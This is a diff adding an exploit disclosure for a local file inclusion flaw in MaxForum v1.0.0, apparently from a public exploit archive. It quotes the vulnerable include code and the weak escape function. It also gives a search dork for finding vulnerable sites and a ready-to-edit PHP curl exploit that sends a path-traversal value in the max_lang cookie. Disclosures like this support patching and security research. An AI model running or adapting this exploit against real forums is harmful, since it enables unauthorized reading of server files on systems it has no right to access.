@@ -1,0 +1,42 @@
++---------------------------------------+
+| MaxForum v1.0.0 Local File Inclusion  |
++---------------------------------------+
+Author.............: ahwak2000
+Mail...............: z.u5[at]hotmail[dot]com
+Software link......: http://www.max4dev.com/
+Tested versions....: 1.0
+Dork...............: Powered by MaxForum v1.0.0
+Date...............: 15/08/2012
+---------------------------------------------------------------
+in file /MaxForum/includes/forums/warn_popup.php 
+
+line 100 			if (isset($_COOKIE['max_lang']) && (!isset($_COOKIE['max_name']))){
+line 101			$board_lang = escape_string($_COOKIE['max_lang']);
+line 102		}
+line 103
+line 104 	@include "../../language/$board_lang";
+line 105 	@include "../../language/$board_lang.php";
+
+
+-------------
+in file /MaxForum/libs/php/functions.php 
+
+		function escape_string($string) {
+
+			$string = addslashes($string);
+			
+			$string = htmlspecialchars($string);
+	   		return $string;
+		}
+----------------------------------------------------------------
+exploit:
+
+<?
+$url="http://site.com/MaxForum/";
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url."/includes/forums/warn_popup.php");
+curl_setopt($ch, CURLOPT_COOKIE, "max_lang=../gpl.txt");  // <--- edit
+ $buffer = curl_exec($ch);
+?>
+
+#end
